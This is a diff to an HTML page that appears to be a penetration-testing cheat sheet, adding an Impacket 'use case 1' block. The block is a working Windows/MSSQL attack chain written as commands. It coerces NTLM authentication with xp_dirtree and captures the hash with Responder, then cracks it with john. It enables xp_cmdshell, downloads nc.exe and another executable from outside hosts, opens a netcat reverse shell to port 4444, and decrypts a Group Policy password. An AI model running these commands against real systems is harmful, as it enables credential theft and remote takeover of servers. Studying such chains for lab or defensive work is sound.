@@ -41,7 +41,29 @@
 
 <h3 id="impacket">Impacket</h3>
 
-<p><pre><code>psexec.py administrator@10.10.10.10</pre></code></p>
+<pre><code>psexec.py administrator@10.10.10.10</pre></code>
+
+
+### use case 1
+<pre>
+./mssqlclient.py HOST/user1:pass1@10.10.10.1 -db volume -windows-auth
+EXEC master..xp_dirtree '\\10.10.16.35\test'
+
+responder -I tun0 -i 10.10.15.230
+
+john -format=netntlmv2 hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+./mssqlclient.py HOST/user2:pass2@10.10.10.1 -db volume -windows-auth
+xp_cmdshell powershell Invoke-WebRequest http://10.10.10.2:8000/file.exe -OutFile c:\Users\mssql-svc\Downloads\file1.exe
+
+enable_xp_cmdshell
+RECONFIGURE
+xp_cmdshell powershell Invoke-WebRequest http://10.10.14.90:8000/nc.exe -OutFile c:\Users\mssql-svc\Downloads\nc.exe
+xp_cmdshell c:\Users\mssql-svc\Downloads\nc.exe nc.exe 192.168.100.113 4444 –e cmd.exe
+
+dir Groups.xml /s
+gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/asdasdasdasdasdasdasd
+</pre>
 
     </div>
   </article>
